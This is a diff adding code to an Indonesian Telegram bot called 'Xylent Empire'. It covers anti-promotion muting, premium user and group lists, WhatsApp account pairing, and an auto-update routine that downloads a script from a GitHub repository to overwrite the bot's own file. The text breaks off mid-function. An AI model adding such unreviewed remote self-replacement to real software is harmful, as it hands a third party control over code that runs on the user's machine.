+////=========ANTI PROMOSI + AUTO MUTE========\\\\
+
+const promoKeywords = [
+  'join', 'gabung', 'promo', 'diskon', 'gratis', 'free',
+  'klik', 'click', 'http://', 'https://', 't.me/', 'wa.me/',
+  'bit.ly', 'linktr', 'invite', 'daftar', 'register', 'sell',
+  'fs', 'forsell', 'apk bug', 'apk', 'minat', 'contact',
+  'jual', 'beli', 'order', 'harga', 'murah', 'terjangkau',
+  'channel', 'group', 'grup', 'bot baru', 'cek bio',
+];
+
+const PROMO_MUTE_DURATION_MS = 5 * 60 * 1000;
+
+// Map userId → timestamp mute berakhir
+const mutedPromo = new Map();
+
+// Map groupId (string) → boolean
+// true  = anti-promo AKTIF di group tersebut
+// false = anti-promo MATI di group tersebut
+// Jika groupId tidak ada di map → default MATI (harus dinyalakan manual)
+const antiPromoGroups = new Map();
+
+// ── Helper ──────────────────────────────────────────────────
+function isPromoMessage(text) {
+  if (!text) return false;
+  const lower = text.toLowerCase();
+  return promoKeywords.some(k => lower.includes(k));
+}
+
+async function isGroupAdmin(ctx, userId) {
+  try {
+    const member = await ctx.telegram.getChatMember(ctx.chat.id, userId);
+    return ['administrator', 'creator'].includes(member.status);
+  } catch {
+    return false;
+  }
+}
+
+// ── Command: /antipromo on|off|status  (Owner & admin group) ─
+bot.command('antipromo', async (ctx) => {
+  // Hanya berlaku di group
+  if (ctx.chat?.type === 'private') {
+    return ctx.reply('⚠️ Command ini hanya bisa digunakan di dalam group.');
+  }
+
+  const userId = ctx.from.id.toString();
+  const groupId = ctx.chat.id.toString();
+
+  // Hanya owner atau admin group yang boleh
+  const isOwner = userId === OWNER_ID.toString();
+  const isAdmin = await isGroupAdmin(ctx, ctx.from.id);
+  if (!isOwner && !isAdmin) {
+    return ctx.reply('⛔ Hanya owner atau admin group yang bisa menggunakan command ini.');
+  }
+
+  const arg = (ctx.message.text.split(' ')[1] || '').toLowerCase();
+  const groupTitle = ctx.chat.title || groupId;
+
+  if (arg === 'on') {
+    antiPromoGroups.set(groupId, true);
+    return ctx.reply(
+      `✅ *Anti-Promo* telah *diaktifkan* di group ini!\n` +
+      `🏠 Group: *${groupTitle}*\n\n` +
+      `Setiap pesan promosi akan dihapus & pengirim di-mute 5 menit.`,
+      { parse_mode: 'Markdown' }
+    );
+  } else if (arg === 'off') {
+    antiPromoGroups.set(groupId, false);
+    return ctx.reply(
+      `🔕 *Anti-Promo* telah *dinonaktifkan* di group ini!\n` +
+      `🏠 Group: *${groupTitle}*`,
+      { parse_mode: 'Markdown' }
+    );
+  } else {
+    // Tampilkan status
+    const isActive = antiPromoGroups.get(groupId) === true;
+    const status = isActive ? '🟢 *ON*' : '🔴 *OFF*';
+    return ctx.reply(
+      `ℹ️ Status Anti-Promo di *${groupTitle}*: ${status}\n\n` +
+      `Gunakan:\n` +
+      `• \`/antipromo on\` — aktifkan di group ini\n` +
+      `• \`/antipromo off\` — nonaktifkan di group ini`,
+      { parse_mode: 'Markdown' }
+    );
+  }
+});
+
+// ── Middleware: Anti promosi per group ──────────────────────
+bot.use(async (ctx, next) => {
+  if (!ctx.message?.text) return next();
+  if (ctx.chat?.type === 'private') return next();
+
+  const groupId = ctx.chat.id.toString();
+
+  // Cek apakah anti-promo aktif di group ini
+  // Default: MATI → harus dinyalakan manual per group
+  if (antiPromoGroups.get(groupId) !== true) return next();
+
+  const userId = ctx.from.id.toString();
+
+  // Owner & admin group bebas
+  if (userId === OWNER_ID.toString()) return next();
+  const isAdmin = await isGroupAdmin(ctx, ctx.from.id);
+  if (isAdmin) return next();
+
+  const text = ctx.message.text;
+  if (!isPromoMessage(text)) return next();
+
+  const username = ctx.from.username ? `@${ctx.from.username}` : `#${userId}`;
+  const fullName = `${ctx.from.first_name || ''}${ctx.from.last_name ? ' ' + ctx.from.last_name : ''}`.trim();
+  const muteStart = new Date();
+  const muteEnd = new Date(Date.now() + PROMO_MUTE_DURATION_MS);
+
+  mutedPromo.set(userId, muteEnd.getTime());
+
+  // Hapus pesan promosi
+  try {
+    await ctx.deleteMessage();
+  } catch (e) {
+    console.error('Gagal hapus pesan:', e.message);
+  }
+
+  // Mute di group via Telegram API
+  try {
+    await ctx.telegram.restrictChatMember(ctx.chat.id, ctx.from.id, {
+      permissions: {
+        can_send_messages: false,
+        can_send_media_messages: false,
+        can_send_other_messages: false,
+        can_add_web_page_previews: false,
+      },
+      until_date: Math.floor(muteEnd.getTime() / 1000),
+    });
+  } catch (e) {
+    console.error('Gagal mute:', e.message);
+  }
+
+  const logMessage =
+    `\`\`\`javascript\n` +
+    `┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓\n` +
+    `   >> ANTI PROMOSI — AUTO MUTE <<\n` +
+    `┗━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
+    `╭───〔 𝐋𝐎𝐆 𝐈𝐍𝐅𝐎 〕───╮\n` +
+    `│ ◈ USER    : ${username}\n` +
+    `│ ◈ NAMA    : ${fullName}\n` +
+    `│ ◈ USER ID : ${userId}\n` +
+    `│ ◈ GROUP   : ${ctx.chat.title || '-'}\n` +
+    `│ ◈ PESAN   : ${text.slice(0, 50)}...\n` +
+    `│ ◈ MUTE    : 5 Menit\n` +
+    `│ ◈ MULAI   : ${formatDateTime(muteStart)}\n` +
+    `│ ◈ BEBAS   : ${formatDateTime(muteEnd)}\n` +
+    `╰──────────────────────╯\n` +
+    `\`\`\``;
+
+  // Log ke OWNER
+  try {
+    await ctx.telegram.sendPhoto(OWNER_ID, 'https://d.top4top.io/p_3804rkv7i1.jpg', {
+      caption: logMessage,
+      parse_mode: 'Markdown'
+    });
+  } catch (e) {
+    console.error('Gagal kirim log owner:', e.message);
+  }
+
+  // Log ke GROUP LOG
+  try {
+    await ctx.telegram.sendPhoto(LOG_GROUP_ID, 'https://d.top4top.io/p_3804rkv7i1.jpg', {
+      caption: logMessage,
+      parse_mode: 'Markdown'
+    });
+  } catch (e) {
+    console.error('Gagal kirim log group:', e.message);
+  }
+
+  // Notif di group
+  await ctx.replyWithPhoto('https://d.top4top.io/p_3804rkv7i1.jpg', {
+    caption:
+      `🚫 *${fullName}* terdeteksi mengirim *pesan promosi* dan telah di-mute!\n\n` +
+      `⏰ *Mulai* : ${formatDateTime(muteStart)}\n` +
+      `✅ *Bebas* : ${formatDateTime(muteEnd)}`,
+    parse_mode: 'Markdown'
+  });
+
+  return;
+});
+
+bot.command('addpromo', async (ctx) => {
+  if (ctx.from.id.toString() !== OWNER_ID) {
+    return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
+  }
+  const args = ctx.message.text.split(' ').slice(1).join(' ').toLowerCase();
+  if (!args) return ctx.reply('⚠️ Contoh: /addpromo kata_promo');
+  if (promoKeywords.includes(args)) return ctx.reply('⚠️ Keyword sudah ada!');
+  promoKeywords.push(args);
+  await ctx.reply(`✅ Keyword *${args}* berhasil ditambahkan!`, { parse_mode: 'Markdown' });
+});
+
+bot.command('delpromo', async (ctx) => {
+  if (ctx.from.id.toString() !== OWNER_ID) {
+    return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
+  }
+  const args = ctx.message.text.split(' ').slice(1).join(' ').toLowerCase();
+  if (!args) return ctx.reply('⚠️ Contoh: /delpromo kata_promo');
+  const idx = promoKeywords.indexOf(args);
+  if (idx === -1) return ctx.reply('⚠️ Keyword tidak ditemukan!');
+  promoKeywords.splice(idx, 1);
+  await ctx.reply(`✅ Keyword *${args}* berhasil dihapus!`, { parse_mode: 'Markdown' });
+});
+
+bot.command('listpromo', async (ctx) => {
+  if (ctx.from.id.toString() !== OWNER_ID) {
+    return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
+  }
+  const list = promoKeywords.map((k, i) => `${i + 1}. ${k}`).join('\n');
+  await ctx.reply(`📋 *Daftar Keyword Promosi:*\n\n${list}`, { parse_mode: 'Markdown' });
+});
+
+bot.command('unmute', async (ctx) => {
+  if (ctx.from.id.toString() !== OWNER_ID) {
+    return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
+  }
+  const target = ctx.message.reply_to_message;
+  if (!target) return ctx.reply('⚠️ Reply pesan user yang mau di-unmute!');
+
+  try {
+    await ctx.telegram.restrictChatMember(ctx.chat.id, target.from.id, {
+      permissions: {
+        can_send_messages: true,
+        can_send_media_messages: true,
+        can_send_other_messages: true,
+        can_add_web_page_previews: true,
+      },
+    });
+    mutedPromo.delete(target.from.id.toString());
+    await ctx.reply(`✅ *${target.from.first_name}* berhasil di-unmute!`, { parse_mode: 'Markdown' });
+  } catch (e) {
+    await ctx.reply('❌ Gagal unmute: ' + e.message);
+  }
+});
+///=== comand blockcmd ===\\\
+// ===============================
+// BLOCK CMD GROUP - TELEGRAF
+// ===============================
+
+bot.command("blockcmd", checkAdmin, async (ctx) => {
+  try {
+    if (ctx.chat.type === "private")
+      return ctx.reply("❌ Command ini hanya untuk grup.");
+
+    const args = ctx.message.text.split(" ").slice(1);
+
+    if (!args[0])
+      return ctx.reply("Example : /blockcmd /menu");
+
+    const cmd = args[0].toLowerCase();
+
+    const db = loadDB();
+    const groupId = String(ctx.chat.id);
+
+    if (!db.groupCmdBlock)
+      db.groupCmdBlock = {};
+
+    if (!db.groupCmdBlock[groupId])
+      db.groupCmdBlock[groupId] = [];
+
+    // sudah ada
+    if (db.groupCmdBlock[groupId].includes(cmd)) {
+      return ctx.reply("⚠️ Command sudah diblock.");
+    }
+
+    db.groupCmdBlock[groupId].push(cmd);
+
+    saveDB(db);
+
+    ctx.reply(`✅ Berhasil block command ${cmd}`);
+  } catch (err) {
+    console.log(err);
+    ctx.reply("Terjadi error.");
+  }
+});
+
+
+// ===============================
+// UNBLOCK CMD GROUP
+// ===============================
+
+bot.command("unblockcmd", checkAdmin, async (ctx) => {
+  try {
+    if (ctx.chat.type === "private")
+      return ctx.reply("❌ Command ini hanya untuk grup.");
+
+    const args = ctx.message.text.split(" ").slice(1);
+
+    if (!args[0])
+      return ctx.reply("Example : /unblockcmd /menu");
+
+    const cmd = args[0].toLowerCase();
+
+    const db = loadDB();
+    const groupId = String(ctx.chat.id);
+
+    if (!db.groupCmdBlock?.[groupId]) {
+      return ctx.reply("⚠️ Tidak ada command yang diblock.");
+    }
+
+    db.groupCmdBlock[groupId] =
+      db.groupCmdBlock[groupId].filter(c => c !== cmd);
+
+    saveDB(db);
+
+    ctx.reply(`✅ Berhasil unblock command ${cmd}`);
+  } catch (err) {
+    console.log(err);
+    ctx.reply("Terjadi error.");
+  }
+});
+
+bot.command("listblockcmd", async (ctx) => {
+  try {
+    const db = loadDB();
+    const chatId = String(ctx.chat.id);
+
+    const blocked =
+      db.groupCmdBlock?.[chatId] || [];
+
+    if (blocked.length < 1) {
+      return ctx.reply(
+        "❌ Tidak ada command yang diblock."
+      );
+    }
+
+    let teks = `📌 LIST BLOCK COMMAND\n\n`;
+
+    blocked.forEach((cmd, i) => {
+      teks += `${i + 1}. ${cmd}\n`;
+    });
+
+    ctx.reply(teks);
+
+  } catch (err) {
+    console.log(err);
+    ctx.reply("Terjadi error.");
+  }
+});
+// Perintah untuk menambahkan pengguna premium (hanya owner)
+bot.command("addadmin", checkOwner, (ctx) => {
+  const args = ctx.message.text.split(" ");
+  if (args.length < 2) {
+    return ctx.reply(
+      "❌ Format Salah!. Example: /addadmin 12345678"
+    );
+  }
+
+  const userId = args[1];
+
+  if (adminUsers.includes(userId)) {
+    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
+  }
+
+  adminUsers.push(userId);
+  saveJSON(adminFile, adminUsers);
+
+  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
+});
+bot.command("addprem", checkOwner, checkAdmin, (ctx) => {
+  const args = ctx.message.text.trim().split(" "); 
+
+  if (args.length < 2) {
+    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
+  }
+
+  const userId = args[1].toString();
+
+  if (premiumUsers.includes(userId)) {
+    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
+  }
+
+  premiumUsers.push(userId);
+  saveJSON(premiumFile, premiumUsers);
+
+  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
+});
+///=== comand del admin ===\\\
+bot.command("deladmin", checkOwner, (ctx) => {
+  const args = ctx.message.text.split(" ");
+  if (args.length < 2) {
+    return ctx.reply(
+      "❌ Format Salah!. Example : /deladmin 12345678"
+    );
+  }
+
+  const userId = args[1];
+
+  if (!adminUsers.includes(userId)) {
+    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
+  }
+
+  adminUsers = adminUsers.filter((id) => id !== userId);
+  saveJSON(adminFile, adminUsers);
+
+  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
+});
+bot.command("delprem", checkOwner, checkAdmin, (ctx) => {
+  const args = ctx.message.text.trim().split(" ");
+
+  if (args.length < 2) {
+    return ctx.reply(
+      "❌ Format Salah!. Example : /delprem 12345678"
+    );
+  }
+
+  const userId = args[1].toString();
+
+  if (!premiumUsers.includes(userId)) {
+    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
+  }
+
+  premiumUsers = premiumUsers.filter((id) => id !== userId);
+  saveJSON(premiumFile, premiumUsers);
+
+  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
+});
+
+
+////=========PREMIUM GROUP========\\\\
+
+const premiumGroupFile = './premiumGroups.json';
+let premiumGroups = loadJSON(premiumGroupFile) || [];
+
+// Helper cek apakah group premium
+function isGroupPremium(chatId) {
+  return premiumGroups.includes(chatId.toString());
+}
+
+// Daftarkan group jadi premium
+bot.command('addpremgroup', checkOwner, async (ctx) => {
+  const chatId = ctx.chat.id.toString();
+
+  if (isGroupPremium(chatId)) {
+    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
+      caption: `\`\`\`javascript
+┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
+   >> PREMIUM GROUP SYSTEM <<
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+
+╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
+│ ◈ STATUS  : ⚠️ Gagal
+│ ◈ REASON  : Group ini sudah
+│             terdaftar premium!
+│ ◈ GROUP   : ${ctx.chat.title}
+│ ◈ ID      : ${chatId}
+╰──────────────────────╯
+\`\`\``,
+      parse_mode: 'Markdown'
+    });
+  }
+
+  premiumGroups.push(chatId);
+  saveJSON(premiumGroupFile, premiumGroups);
+
+  await ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
+    caption: `\`\`\`javascript
+┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
+   >> PREMIUM GROUP SYSTEM <<
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+
+╭───〔 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 〕───╮
+│ ◈ STATUS  : ✅ Berhasil
+│ ◈ GROUP   : ${ctx.chat.title}
+│ ◈ ID      : ${chatId}
+│ ◈ AKSES   : ✨ Premium Aktif
+│
+│  Semua member di group ini
+│  sekarang bisa akses fitur
+│  premium!
+╰──────────────────────╯
+\`\`\``,
+    parse_mode: 'Markdown'
+  });
+});
+
+// Hapus group dari premium
+bot.command('delpremgroup', checkOwner, async (ctx) => {
+  const chatId = ctx.chat.id.toString();
+
+  if (!isGroupPremium(chatId)) {
+    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
+      caption: `\`\`\`javascript
+┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
+   >> PREMIUM GROUP SYSTEM <<
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+
+╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
+│ ◈ STATUS  : ❌ Gagal
+│ ◈ REASON  : Group ini bukan
+│             group premium!
+│ ◈ GROUP   : ${ctx.chat.title}
+│ ◈ ID      : ${chatId}
+╰──────────────────────╯
+\`\`\``,
+      parse_mode: 'Markdown'
+    });
+  }
+
+  premiumGroups = premiumGroups.filter(id => id !== chatId);
+  saveJSON(premiumGroupFile, premiumGroups);
+
+  await ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
+    caption: `\`\`\`javascript
+┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
+   >> PREMIUM GROUP SYSTEM <<
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+
+╭───〔 𝐃𝐄𝐋𝐄𝐓𝐄𝐃 〕───╮
+│ ◈ STATUS  : 🚫 Dihapus
+│ ◈ GROUP   : ${ctx.chat.title}
+│ ◈ ID      : ${chatId}
+│ ◈ AKSES   : ❌ Dicabut
+╰──────────────────────╯
+\`\`\``,
+    parse_mode: 'Markdown'
+  });
+});
+
+// Tambah group lain jadi premium via ID (dari private)
+bot.command('addpremgroupid', checkOwner, async (ctx) => {
+  const args = ctx.message.text.split(' ').slice(1);
+
+  if (!args[0]) {
+    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
+      caption: `\`\`\`javascript
+┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
+   >> PREMIUM GROUP SYSTEM <<
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+
+╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
+│ ◈ STATUS  : ⚠️ Gagal
+│ ◈ REASON  : Format salah!
+│
+│  Contoh penggunaan:
+│  /addpremgroupid -100xxx
+╰──────────────────────╯
+\`\`\``,
+      parse_mode: 'Markdown'
+    });
+  }
+
+  const chatId = args[0].toString();
+
+  if (isGroupPremium(chatId)) {
+    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
+      caption: `\`\`\`javascript
+┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
+   >> PREMIUM GROUP SYSTEM <<
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+
+╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
+│ ◈ STATUS  : ⚠️ Gagal
+│ ◈ REASON  : Group sudah premium!
+│ ◈ ID      : ${chatId}
+╰──────────────────────╯
+\`\`\``,
+      parse_mode: 'Markdown'
+    });
+  }
+
+  premiumGroups.push(chatId);
+  saveJSON(premiumGroupFile, premiumGroups);
+
+  await ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
+    caption: `\`\`\`javascript
+┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
+   >> PREMIUM GROUP SYSTEM <<
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+
+╭───〔 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 〕───╮
+│ ◈ STATUS  : ✅ Berhasil
+│ ◈ ID      : ${chatId}
+│ ◈ AKSES   : ✨ Premium Aktif
+│
+│  Group berhasil didaftarkan
+│  sebagai premium!
+╰──────────────────────╯
+\`\`\``,
+    parse_mode: 'Markdown'
+  });
+});
+// Hapus group lain dari premium via ID
+bot.command('delpremgroupid', checkOwner, async (ctx) => {
+  const args = ctx.message.text.split(' ').slice(1);
+
+  if (!args[0]) {
+    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
+      caption: `\`\`\`javascript
+┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
+   >> PREMIUM GROUP SYSTEM <<
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+
+╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
+│ ◈ STATUS  : ⚠️ Gagal
+│ ◈ REASON  : Format salah!
+│
+│  Contoh penggunaan:
+│  /delpremgroupid -100xxx
+╰──────────────────────╯
+\`\`\``,
+      parse_mode: 'Markdown'
+    });
+  }
+
+  const chatId = args[0].toString();
+
+  if (!isGroupPremium(chatId)) {
+    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
+      caption: `\`\`\`javascript
+┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
+   >> PREMIUM GROUP SYSTEM <<
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+
+╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
+│ ◈ STATUS  : ⚠️ Gagal
+│ ◈ REASON  : Group bukan
+│             group premium!
+│ ◈ ID      : ${chatId}
+╰──────────────────────╯
+\`\`\``,
+      parse_mode: 'Markdown'
+    });
+  }
+
+  premiumGroups = premiumGroups.filter(id => id !== chatId);
+  saveJSON(premiumGroupFile, premiumGroups);
+
+  await ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
+    caption: `\`\`\`javascript
+┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
+   >> PREMIUM GROUP SYSTEM <<
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+
+╭───〔 𝐃𝐄𝐋𝐄𝐓𝐄𝐃 〕───╮
+│ ◈ STATUS  : 🚫 Dihapus
+│ ◈ ID      : ${chatId}
+│ ◈ AKSES   : ❌ Dicabut
+│
+│  Group berhasil dihapus
+│  dari daftar premium!
+╰──────────────────────╯
+\`\`\``,
+    parse_mode: 'Markdown'
+  });
+});
+
+////=========LIST PREM GROUP========\\\\
+bot.command('listpremgroup', checkOwner, async (ctx) => {
+  if (premiumGroups.length === 0) {
+    return ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
+      caption: `\`\`\`javascript
+┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
+   >> PREMIUM GROUP SYSTEM <<
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+
+╭───〔 𝐋𝐈𝐒𝐓 〕───╮
+│ ◈ STATUS  : ⚠️ Kosong
+│ ◈ REASON  : Belum ada group
+│             yang terdaftar
+│             premium!
+╰──────────────────────╯
+\`\`\``,
+      parse_mode: 'Markdown'
+    });
+  }
+
+  const list = premiumGroups.map((id, i) => `│ ${i + 1}. ${id}`).join('\n');
+
+  await ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
+    caption: `\`\`\`javascript
+┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
+   >> PREMIUM GROUP SYSTEM <<
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+
+╭───〔 𝐋𝐈𝐒𝐓 𝐆𝐑𝐎𝐔𝐏 〕───╮
+│ ◈ TOTAL : ${premiumGroups.length} Group
+├──────────────────────
+${list}
+╰──────────────────────╯
+\`\`\``,
+    parse_mode: 'Markdown'
+  });
+});
+
+////=========CEK PREM GROUP========\\\\
+bot.command('cekpremgroup', async (ctx) => {
+  const chatId = ctx.chat.id.toString();
+  const status = isGroupPremium(chatId);
+
+  await ctx.replyWithPhoto('https://l.top4top.io/p_3803smv0s1.jpg', {
+    caption: `\`\`\`javascript
+┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
+   >> PREMIUM GROUP SYSTEM <<
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+
+╭───〔 𝐒𝐓𝐀𝐓𝐔𝐒 〕───╮
+│ ◈ GROUP   : ${ctx.chat.title || '-'}
+│ ◈ ID      : ${chatId}
+│ ◈ PREMIUM : ${status ? '✅ Aktif' : '❌ Tidak Aktif'}
+╰──────────────────────╯
+\`\`\``,
+    parse_mode: 'Markdown'
+  });
+});
+// Perintah untuk mengecek status premium
+bot.command("cekprem", (ctx) => {
+  const userId = ctx.from.id.toString();
+
+  if (premiumUsers.includes(userId)) {
+    return ctx.reply(`✅ Anda adalah pengguna premium.`);
+  } else {
+    return ctx.reply(`❌ Anda bukan pengguna premium.`);
+  }
+});
+
+// Command untuk pairing WhatsApp
+bot.command("addsender", checkOwner, async (ctx) => {
+  const args = ctx.message.text.split(" ");
+  if (args.length < 2) {
+    return await ctx.reply("❌ Format Salah!. Example : /addsender <nomor_wa>");
+  }
+
+  let phoneNumber = args[1];
+  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");
+
+  if (sock && sock.user) {
+    return await ctx.reply("Whatsapp Sudah Terhubung");
+  }
+
+  try {
+    const code = await sock.requestPairingCode(phoneNumber, "XYLENTTl");
+    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
+
+    await ctx.replyWithPhoto(getRandomImage(), {
+      caption: `
+<blockquote>
+┏━━━━━━━━━━━━━━━━━━━━
+┃☇ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
+┃☇ 𝗖𝗼𝗱𝗲 : <code>${formattedCode}</code>
+┗━━━━━━━━━━━━━━━━━━━━
+</blockquote>
+`,
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[{ text: "dєvєlσpєrs", url: "https://t.me/xyzenofficial" }]],
+      },
+    });
+  } catch (error) {
+    console.error(chalk.red("Gagal melakukan pairing:"), error);
+    await ctx.reply("❌ Gagal melakukan pairing !");
+  }
+});
+///=== comand del sesi ===\\\\
+bot.command("delsesi", (ctx) => {
+  const success = deleteSession();
+
+  if (success) {
+    ctx.reply("✅ Session berhasil di hapus, silahkan connect ulang");
+  } else {
+    ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
+  }
+});
+////=== Fungsi Delete Session ===\\\\\\\
+function deleteSession() {
+  if (fs.existsSync(sessionPath)) {
+    const stat = fs.statSync(sessionPath);
+
+    if (stat.isDirectory()) {
+      fs.readdirSync(sessionPath).forEach(file => {
+        fs.unlinkSync(path.join(sessionPath, file));
+      });
+      fs.rmdirSync(sessionPath);
+      console.log('Folder session berhasil dihapus.');
+    } else {
+      fs.unlinkSync(sessionPath);
+      console.log('File session berhasil dihapus.');
+    }
+
+    return true;
+  } else {
+    console.log('Session tidak ditemukan.');
+    return false;
+  }
+}
+
+////=========COOLDOWN SYSTEM========\\\\
+
+bot.command("setcd", async (ctx) => {
+    if (ctx.from.id != OWNER_ID) {
+        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
+    }
+
+    const args = ctx.message.text.split(" ");
+    const seconds = parseInt(args[1]);
+
+    if (isNaN(seconds) || seconds < 0) {
+        return ctx.reply("🪧 ☇ Format: /setcd 5");
+    }
+
+    cooldown = seconds
+    saveCooldown(seconds)
+    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
+});
+
+////////// OWNER MENU \\\\\\\\\
+bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
+  try {
+    const waStatus = sock && sock.user
+      ? "🟢 Connect"
+      : "🔴 No Connect";
+
+    const message = `
+<blockquote>
+┏━━━━━━━━━━━━━━━━━━━━
+┃ STATUS WHATSAPP
+┣━━━━━━━━━━━━━━━━━━━━
+┃ ⌬ STATUS : ${waStatus}
+┗━━━━━━━━━━━━━━━━━━━━
+</blockquote>
+`;
+
+    await ctx.reply(message, {
+      parse_mode: "HTML"
+    });
+
+  } catch (error) {
+    console.error("Gagal menampilkan status bot:", error);
+    ctx.reply("❌ Gagal menampilkan status bot.");
+  }
+});
+
+// ─── CONFIG ────────────────────────────────────────────────────────────────
+const CONFIG = {
+  OWNER_ID     : 8768626313,
+  RAW_URL      : "https://raw.githubusercontent.com/DAFARELXP/Xylent-Empire/main/empire.js",
+  COMMITS_API  : "https://api.github.com/repos/DAFARELXP/Xylent-Empire/commits?path=empire.js&per_page=5",
+  LOCAL_FILE   : path.join(__dirname, "empire.js"),
+  INTERVAL_MIN : 5,
+};
+
+let autoUpdateEnabled = false;
+let checkIntervalID   = null;
+let lastKnownSHA      = null;
+
+// ─── HELPERS ───────────────────────────────────────────────────────────────
+function ownerOnly(ctx) {
+  if (!ctx.from || ctx.from.id !== CONFIG.OWNER_ID) {
+    ctx.reply(
+      `<blockquote>⛔ Perintah ini hanya untuk <b>owner</b>.</blockquote>`,
+      { parse_mode: "HTML" }
+    );
+    return false;
+  }
+  return true;
+}
+
+function httpGet(url) {
+  return new Promise((resolve, reject) => {
+    https.get(url, { headers: { "User-Agent": "XylentEmpireBot" } }, (res) => {
+      let body = "";
+      res.on("data", (chunk) => (body += chunk));
+      res.on("end", () => resolve({ status: res.statusCode, body }));
+    }).on("error", reject);
+  });
+}
+
+async function getLatestSHA() {
+  const { body } = await httpGet(CONFIG.COMMITS_API);
+  const commits  = JSON.parse(body);
+  if (!Array.isArray(commits) || !commits[0]) throw new Error("Commit list kosong");
+  return commits[0].sha;
+}
+
+async function downloadFile() {
+  const response = await axios.get(CONFIG.RAW_URL, { timeout: 10000 });
+  const newData  = response.data;
+
+  if (!newData || typeof newData !== "string") {
+    throw new Error("File dari server kosong atau tidak valid.");
+  }
+
+  if (fs.existsSync(CONFIG.LOCAL_FILE)) {
